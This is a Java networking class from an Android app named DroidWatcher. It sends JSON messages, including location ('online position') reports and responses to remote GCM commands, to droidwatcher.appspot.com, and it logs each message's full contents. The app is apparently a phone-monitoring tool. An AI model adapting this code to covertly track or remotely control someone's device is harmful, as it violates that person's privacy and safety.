package com.droidwatcher;

import java.util.Locale;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import android.content.Context;
import android.content.Intent;

import com.droidwatcher.lib.ServerConst;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.IServerMessage;

public class ServerMessanger extends Thread {
	public static final String SERVER_ADDRESS = "http://droidwatcher.appspot.com/";
	
	private static final String SERVER_ADDRESS_SERVICE = SERVER_ADDRESS + "Service"; 
	private static final String SERVER_ADDRESS_VIEWER = SERVER_ADDRESS + "Viewer"; 
	private static final String SERVER_ADDRESS_GCM = SERVER_ADDRESS + "GCM";
	private static final String SERVER_ADDRESS_ONLINE = SERVER_ADDRESS + "Online";
	
	private IServerMessage msg;
	private Context context;
	private ICallBack callback;
	
	public ServerMessanger(Context context, IServerMessage message){
		this(context, message, null);
	}
	
	public ServerMessanger(Context context, IServerMessage message, ICallBack callback){
		this.msg = message;
		this.context = context;
		this.callback = callback;
	}
	
	@Override
	public void run(){
		try {			
			HttpPost httpPost = null;
			HttpClient httpClient = new DefaultHttpClient();
			
			switch (msg.getType()) {
			case GCM_REG:
			case GCM_PING_RESPONSE:
			case GCM_COMMAND_RESPONSE:
				httpPost = new HttpPost(SERVER_ADDRESS_GCM);
				break;
			case ONLINE_POSITION:
				httpPost = new HttpPost(SERVER_ADDRESS_ONLINE);
				break;
			case REGISTER:
				httpPost = new HttpPost(SERVER_ADDRESS_VIEWER);
				break;
			default:
				httpPost = new HttpPost(SERVER_ADDRESS_SERVICE);
				break;
			}
			
			Debug.i(msg.getJSONString());
			
			StringEntity stringEntity = new StringEntity(msg.getJSONString(), "UTF-8");	
			stringEntity.setContentEncoding("UTF-8");
			stringEntity.setContentType("application/json");
			httpPost.setEntity(stringEntity);
			httpPost.setHeader("Content-type", "application/json; charset=UTF-8");
			
			HttpResponse response = httpClient.execute(httpPost);
			if (response != null){
				HttpEntity entity = response.getEntity();
				
				if (entity != null) {
	                String data = EntityUtils.toString(entity, "UTF-8");	                
	                callBack(data);
	            }
			}
		}
		catch (Exception e) {
			Debug.exception(e);
			
			if (callback != null) {
				callback.onError();
			}
		}
	}
	
//	public static String compressString(String srcTxt) throws java.io.IOException {
//		  java.io.ByteArrayOutputStream rstBao = new java.io.ByteArrayOutputStream();
//		  java.util.zip.GZIPOutputStream zos = new java.util.zip.GZIPOutputStream(rstBao);
//		  zos.write(srcTxt.getBytes());
//		  zos.close();
//
//		  byte[] bytes = rstBao.toByteArray();
//		  return android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
//	}
	
	private void callBack(String response){
		response = response.toLowerCase(Locale.US);
		Debug.i(msg.getType() + " response: " + response);
		
		if (callback == null) {
			return;
		}
		
		boolean handled = callback.onFinished(response);
		if (handled) {
			return;
		}
		
		if (response.equals(ServerConst.OK)) {
			callback.onSuccess();
		}
		else{
			callback.onError();
		}
		
		if (response.equals(ServerConst.DISCONNECT)){
			new SettingsManager(context).connected(false);
			context.stopService(new Intent(context, AppService.class));
		}
	}
	
	public interface ICallBack {
		/**
		 * Fires on request finished
		 * @param response - response body
		 * @return true if event was handled, otherwise onSuccess or onError will fire
		 */
		public boolean onFinished(String response);
		/**
		 * Fires if server response != "ok"
		 */
		public void onError();
		/**
		 * Fires if server response == "ok"
		 */
		public void onSuccess();
	}
}
